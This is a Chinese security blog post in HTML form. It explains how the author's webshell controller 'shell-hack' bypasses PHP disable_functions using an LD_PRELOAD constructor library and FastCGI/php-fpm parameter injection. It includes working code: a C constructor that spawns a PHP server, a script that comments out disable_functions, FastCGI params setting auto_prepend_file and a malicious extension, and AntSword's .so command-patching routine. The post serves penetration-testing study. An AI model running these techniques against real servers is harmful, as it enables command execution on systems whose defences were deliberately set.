@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<!--[if lte IE 8 ]>
+<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<!--
+***************  *      *     *
+      8          *    *       *
+      8          *  *         *
+      8          **           *
+      8          *  *         *
+      8          *    *       *
+      8          *      *     *
+      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
+-->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+<!--<![endif]-->
+
+<head>
+  <title>从shell-hack的角度来看待bypass disable_functions | s1mple</title>
+  <!-- Meta data -->
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="generator" content="s1mple">
+    <meta name="author" content="s1mple">
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+
+    <!-- Favicon, (keep icon in root folder) -->
+    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">
+
+    <link rel="alternate" href="/atom.xml" title="s1mple" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
+    
+    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
+    
+
+    <!--[if IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
+    <![endif]-->
+
+    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
+    <script src="/js/jquery-1.11.1.min.js"></script>
+    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>
+
+    <!-- Load these in the <head> for quicker IE8+ load times -->
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="/js/html5shiv.min.js"></script>
+    <script src="/js/respond.min.js"></script>
+    <![endif]-->
+
+  
+  
+  
+
+  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body id="index" class="lightnav animsition">
+
+      <!-- ============================ Off-canvas navigation =========================== -->
+
+    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
+        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
+            <img src="/img/close.png" alt="Close"/>
+        </div>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu">
+            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
+            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
+            <!-- Dropdown Menu -->
+			 
+            <li>
+                <a class="sb-toggle-submenu">Works<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                        <li><a href="/" target="_BLANK" class="animsition-link"></a></li>
+                    
+                        <li><a href="/atom.xml" target="_BLANK" class="animsition-link"></a></li>
+                    
+                </ul>
+            </li>
+            
+            
+            
+            <li>
+                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                    <li><a target="_blank" rel="noopener" href="https://blog.zeddyu.info/" class="animsition-link">陆队</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://st4ck.gitee.io/" class="animsition-link">书鱼</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://boluochuixue.top/" class="animsition-link">菠萝吹雪</a></li>
+                    
+                    <li><a target="_blank" rel="noopener" href="https://rmb122.com/" class="animsition-link">rmb</a></li>
+                    
+                </ul>
+            </li>
+            
+        </ul>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu secondary">
+            
+            <li><a href="/about.html" class="animsition-link" title="about">About</a></li>
+            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
+        </ul>
+    </div>
+    
+    <!-- ============================ END Off-canvas navigation =========================== -->
+
+    <!-- ============================ #sb-site Main Page Wrapper =========================== -->
+
+    <div id="sb-site">
+        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+        <div id="navigation" class="navbar navbar-fixed-top">
+            <div class="navbar-inner">
+                <div class="container">
+                    <!-- Nav logo -->
+                    <div class="logo">
+                        <a href="/" title="Logo" class="animsition-link">
+                         <img src="/img/logo.png" alt="Logo" width="35px;"/> 
+                        </a>
+                    </div>
+                    <!-- // Nav logo -->
+                    <!-- Info-bar -->
+                    <nav>
+                        <ul class="nav">
+                            <li><a href="/" class="animsition-link">s1mple</a></li>
+                            <li class="nolink"><span>Always </span>Creative.</li>
+                            
+                            <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a></li>
+                            
+                            
+                            <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
+                            
+                            
+                            <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a></li>
+                            
+                            
+                            <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a></li>
+                            
+                            
+                            <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a></li>
+                            
+                            <li class="nolink"><span>Welcome!</span></li>
+                        </ul>
+                    </nav>
+                    <!--// Info-bar -->
+                </div>
+                <!-- // .container -->
+                <div class="learnmore sb-toggle-right">More</div>
+                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar before"></span>
+                <span class="icon-bar main"></span>
+                <span class="icon-bar after"></span>
+                </button>
+            </div>
+            <!-- // .navbar-inner -->
+        </div>
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+
+      
+<section id="intro">
+    <div class="container">
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2021-09-23T07:18:44.000Z" itemprop="datePublished">
+          2021-09-23
+      </time>
+    
+</span>
+                <h1>从shell-hack的角度来看待bypass disable_functions</h1>
+            </div>
+        </div>
+        <div class="col-md-8 col-md-offset-2">
+      		<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>​    之前大二暑假开发了一款基于终端的webshell-controller；相应的代码开源选择了在中秋节前夕；在后期的比赛当中也展现出相应的风采，比如上海的极客谷杯中相应的数据库操作和反弹shell之类的操作完美施展，没有什么错误；在shell-hack中我个人加入相对比较重要的一些点是支持bypass disable_functions;</p>
+<p>下面主要介绍两个bypass的原理实现；</p>
+<h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>​    shell-hack有多种bypass disable_functions的方法；相关的实现原理和我开发的思路在此简要的记录；</p>
+<h3 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h3><p>先来看相应的bypass流程实现；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/TPLotI"><img src="https://s4.ax1x.com/2021/12/16/TPLotI.png" alt="TPLotI.png"></a></p>
+<p>​    为了方便使用，我这直接将其bypass功能融合在一个选择器中；主要的原理其实也就是利用mail或者imap_mail或者error_log去进行相关底层getuid的劫持或者利用gcc拓展修饰符去劫持掉整个进程；因为mail和error_log又或者imap_mail其实现的效果是会去调用linux的sendmail命令，sendmail底层实现是有一步是调用C中的getuid函数进行实现；所以就可劫持；但是为了拓展攻击面，往往采用后者去利用gcc拓展修饰符劫持掉整个进程；</p>
+<p>利用putenv函数设置LD_PRELOAD环境变量，加载恶意的拓展库；这里为了持续执行命令我设置的是直接开启新端口；新端口采用-c去指定相应的恶意ini执行；xxx函数的执行优先级高于main；在so被加载的时候会直接执行；又因为新进程最开始的第一步是需要去加载env；当解析到LD_PRELOAD的时候就会去相应的path下加载构造的恶意拓展库；所以xxx函数整体的执行优先级最高；</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">xxx</span> <span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;php -S 0.0.0.0:65534 -c /tmp/php.ini&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>恶意ini获取的方式为以下两个方法：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">self</span>):</span></span><br><span class="line">        token = self.random_string()</span><br><span class="line">        url = <span class="string">&quot;http://&quot;</span> + self.urls</span><br><span class="line">        data = &#123;self.pwd: <span class="string">&quot;echo &#x27;&quot;</span>+token+<span class="string">&quot;&#x27;;echo php_ini_loaded_file();echo &#x27;&quot;</span>+token+<span class="string">&quot;&#x27;;&quot;</span>&#125;</span><br><span class="line">        res = requests.post(url=url,data=data)</span><br><span class="line">        reqconss = res.content</span><br><span class="line">        reqcons = reqconss.decode(encoding=<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">        rere = reqcons.split(token, <span class="number">2</span>)[<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> rere</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">change_phpini</span>(<span class="params">self</span>):</span></span><br><span class="line"></span><br><span class="line">        path = self.test()</span><br><span class="line">        content = self.readfile(path)</span><br><span class="line">        contents = content.replace(<span class="string">&quot;disable_functions&quot;</span>,<span class="string">&quot;;disable_functions&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> contents</span><br></pre></td></tr></table></figure>
+
+<p>通过php_ini_loaded_file函数拿到相应的ini路径，然后调用我设计的readfile接口去进行读取；有意思的是readfile接口我内部实现了四种读文件的方法；会根据相应的server环境去自动识别绕过一般的disable_function限制去读取；读取完之后将disable_functions配置注释掉即可；然后将其传入相应的server的/tmp下方便去包含启用恶意ini；</p>
+<p>这里我之前看过蚁剑底层实现原理，蚁剑底层是直接采取-n不启用相应的ini；我当时开发的时候简单的翻了翻文档发现可以采用-c；去指定相应的运载恶意ini；这里就可达到相应的bypass；但是考虑到新开端口，流量无法传入进去；所以需要上一个流量转发脚本；shell-hack中也写好了一套流量转发可以将请求到s1mple.php的流量转发到相应的恶意server端口；</p>
+<p>流量转发脚本的原理就是先使用$_SERVER全局数组去拿到相应的请求信息；然后过滤掉非必要信息，然后根据请求的method去进行流量包的构造；如果是post请求，就会去调用file_get_contents(‘php://input); 去读取到相应的post的数据</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$post_data = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>然后再将相应的http请求包加以整合，利用php中fsockopen函数去模仿http请求，将请求包发到指定的恶意port；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/TPxFi9"><img src="https://s4.ax1x.com/2021/12/16/TPxFi9.png" alt="TPxFi9.png"></a></p>
+<p>最后利用fread进行相关数据的读取；最后呈现到客户端；</p>
+<h3 id="介绍完了LD-PRELOAD的bypass实现之后再来说一种攻击php-fpm的bypass方式；"><a href="#介绍完了LD-PRELOAD的bypass实现之后再来说一种攻击php-fpm的bypass方式；" class="headerlink" title="介绍完了LD_PRELOAD的bypass实现之后再来说一种攻击php-fpm的bypass方式；"></a>介绍完了LD_PRELOAD的bypass实现之后再来说一种攻击php-fpm的bypass方式；</h3><p>众所周知，php代码真正执行的地方是在php-fpm中；当流量达到中间件的时候中间件会调用fast-cgi模块进行解析；用Fast-CGI协议重新封装，然后以相应的规定格式将数据传到后面默认监听在9000端口的php-fpm；php-fpm 据fast-cgi协议将TCP流解析成真正的数据,调用php文件；具体的说php-fpm有两个大进程，一个worker，一个master；master负责相应的监听，接收来自 Web Server 的请求；只有一个进程；</p>
+<p>当拿到数据的时候就将相应的数据解析去调用fpm去进行相应的php文件的解析处理。有必要说的是php-fpm并非只是单独的一个。本质上可以将其简单的理解为一个进程池；其中有很多php-fpm进程，每个进程内部都嵌入了一个 PHP 解释器；如果在处理php的时候某个进程发生了崩溃也不会影响到其他的进程；</p>
+<p>所以理解了这里相应的攻击思路就已经出来了；可以伪造相应的fastcgi模块解析直接和后面php-fpm进行通信；当然如果细致的划分的话具体还有两种多种利用方式；如果server端相应的设置不当，导致监听127.0.0.1:9000和0.0.0.0:9000混淆，就有可能导致fpm服务接口外漏；就可以直接进行和9000端口交互进行攻击；</p>
+<p>P牛之前出过一个python的脚本，直接构造然后利用socket进行send数据进行交互；然后利用recv接受相关的返回数据然后进行解析；</p>
+<p>有意思的是看一下p牛脚本中的构造数据属性</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">params = &#123;</span><br><span class="line">        <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class="line">        <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="string">&#x27;application/text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="string">&quot;%d&quot;</span> % <span class="built_in">len</span>(content),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>主要的实现点是在最后两个属性处；PHP_ADMIN_VALUE可以覆盖php.ini中的配置；SCRIPT_FILENAME用于指定一个执行的脚本文件；所以思路已经很清晰了，利用PHP_ADMIN_VALUE覆盖掉原本ini中的配置文件；将其修改为我们需要去加载的恶意点；</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span> =&gt; <span class="string">&quot;extension_dir = /tmp\nextension = s1mple.so&quot;</span>,</span><br></pre></td></tr></table></figure>
+
+<p>覆盖掉原本ini中的extension_dir配置和extension配置；将其设置为恶意的so库的path；所以导致php-fpm会去加载恶意的so拓展库；再加载恶意的拓展之后就自然开启了恶意的服务；所以配置SCRIPT_FILENAME这里设置值比较随意，但是这个字段是必要的；没有相应的字段会发生报错；所以我使用的时候直接将其赋值为了相应的php脚本文件(/tmp/s1mple.php)；</p>
+<p>执行完之后就会在恶意的port上开启一个使用相应/tmp/php.ini的server；但是这里我程序并没有上传相应的ini；所以-c为空；所以就不载入ini开启一个server；蚁剑的底层实现原理是利用-n去进行相应的不载入，效果和我载入为空的效果是一样的；贴一下蚁剑底层；</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> cmd = <span class="string">`<span class="subst">$&#123;phpbinary&#125;</span> -n -S 127.0.0.1:<span class="subst">$&#123;port&#125;</span> -t <span class="subst">$&#123;self.top.infodata.phpself&#125;</span>`</span>;</span><br><span class="line"><span class="keyword">let</span> fileBuffer = self.generateExt(cmd);</span><br><span class="line"><span class="function"><span class="title">generateExt</span>(<span class="params">cmd</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> self = <span class="built_in">this</span>;</span><br><span class="line">    <span class="keyword">let</span> fileBuff = fs.readFileSync(self.ext_path);</span><br><span class="line">    <span class="keyword">let</span> start = <span class="number">0</span>, end = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (self.ext_name) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;ant_x86.so&#x27;</span>:</span><br><span class="line">        start = <span class="number">275</span>;</span><br><span class="line">        end = <span class="number">504</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;ant_x64.so&#x27;</span>:</span><br><span class="line">        <span class="comment">// 434-665</span></span><br><span class="line">        start = <span class="number">434</span>;</span><br><span class="line">        end = <span class="number">665</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;ant_x86.dll&#x27;</span>:</span><br><span class="line">        start = <span class="number">1544</span>;</span><br><span class="line">        end = <span class="number">1683</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">&#x27;ant_x64.dll&#x27;</span>:</span><br><span class="line">        start = <span class="number">1552</span>;</span><br><span class="line">        end = <span class="number">1691</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="title">if</span>(<span class="params">cmd.length &gt; (end - start)</span>)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    fileBuff[end] = <span class="number">0</span>;</span><br><span class="line">    fileBuff.write(<span class="string">&quot;                    &quot;</span>, start);</span><br><span class="line">    fileBuff.write(cmd, start);<span class="comment">//空出固定位置写入命令打包成so或者dll；适用于win和linux；</span></span><br><span class="line">    <span class="keyword">return</span> fileBuff;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后放一下shell-hack攻击的效果；</p>
+<p><a target="_blank" rel="noopener" href="https://imgtu.com/i/TiMVNd"><img src="https://s4.ax1x.com/2021/12/17/TiMVNd.png" alt="TiMVNd.png"></a></p>
+<p>两种攻击方式简单介绍完毕，至于还有的攻击cgi_module执行cgi脚本之类的，相对不是很难，更包括php7之后的FFI利用方式；允许php中加载C代码；也可变形的绕过以实现执行C而不经过fpm从而绕过disable_functions；当然还有一些基于底层二进制的，偏移啥的23333；</p>
+
+            <div class="clearfix"></div>
+            <hr class="nogutter">
+        </div>
+        <nav class="m-pagination col-md-8 col-md-offset-2 col-sm-24" role="pagination">
+    
+    
+    <a class="pull-right" href="/2021/08/16/inctf%E4%B8%80%E9%81%93sql%E6%B3%A8%E5%85%A5%E9%A2%98%E6%9C%89%E6%84%9F/">
+        inctf一道sql注入题有感 →
+    </a>
+    
+</nav>
+
+        <div class="col-md-8 col-md-offset-2 col-sm-24"><script type="text/javascript">
+  /**
+   * 搜狐畅言
+   */
+
+  /*
+  document.write('<div id="SOHUCS" sid="' + window.location.pathname.slice(1) + '" ></div>');
+
+  window.onload = function () {
+    (function () {
+      var appid = 'cytXXXX';
+      var conf = 'prod_xxxxxxxxxxxxxxxxx';
+      var width = window.innerWidth || document.documentElement.clientWidth;
+      var loadJs = function (d, a, id) {
+        var c = document.getElementsByTagName("head")[0] || document.head || document.documentElement;
+        var b = document.createElement("script");
+        b.setAttribute("type", "text/javascript");
+        b.setAttribute("charset", "UTF-8");
+        b.setAttribute("src", d);
+        if (id) {
+          b.setAttribute("id", id);
+        }
+        if (typeof a === "function") {
+          if (window.attachEvent) {
+            b.onreadystatechange = function () {
+              var e = b.readyState;
+              if (e === "loaded" || e === "complete") {
+                b.onreadystatechange = null;
+                a()
+              }
+            }
+          } else {
+            b.onload = a
+          }
+        }
+        c.appendChild(b)
+      };
+
+      loadJs("https://changyan.sohu.com/upload/changyan.js", function () {
+        window.changyan.api.config({
+          appid: appid,
+          conf: conf
+        })
+      });
+    })();
+  }
+  */
+
+</script>
+</div>
+    </div>
+</section>
+
+
+      
+<!-- ============================ Footer =========================== -->
+
+<footer>
+    <div class="container">
+            <div class="copy">
+                <p>
+                    &copy; 2014<script>new Date().getFullYear()>2010&&document.write("-"+new Date().getFullYear());</script>, Content By s1mple. All Rights Reserved.
+                </p>
+                <p>Theme By <a target="_blank" rel="noopener" href="//go.kieran.top" style="color: #767D84">Kieran</a></p>
+            </div>
+            <div class="social">
+                <ul>
+                    
+                    <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a>&nbsp;</li>
+                    
+                    
+                    <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a>&nbsp;</li>
+                    
+                </ul>
+            </div>
+            <div class="clearfix"> </div>
+        </div>
+</footer>
+
+<!-- ============================ END Footer =========================== -->
+      <!-- Load our scripts -->
+<!-- Resizable 'on-demand' full-height hero -->
+<script type="text/javascript">
+    var resizeHero = function () {
+        var hero = $(".cover,.heightblock"),
+            window1 = $(window);
+        hero.css({
+            "height": window1.height()
+        });
+    };
+
+    resizeHero();
+
+    $(window).resize(function () {
+        resizeHero();
+    });
+</script>
+<script src="/js/plugins.min.js"></script><!-- Bootstrap core and concatenated plugins always load here -->
+<script src="/js/scripts.js"></script><!-- Theme scripts -->
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+$('#intro').find('img').each(function(){
+  var alt = this.alt;
+
+  if (alt){
+    $(this).after('<span class="caption" style="display:none">' + alt + '</span>');
+  }
+
+  $(this).wrap('<a href="' + this.src + '" title="' + alt + '" class="fancybox" rel="gallery" />');
+});
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+      
+</body>
+</html>
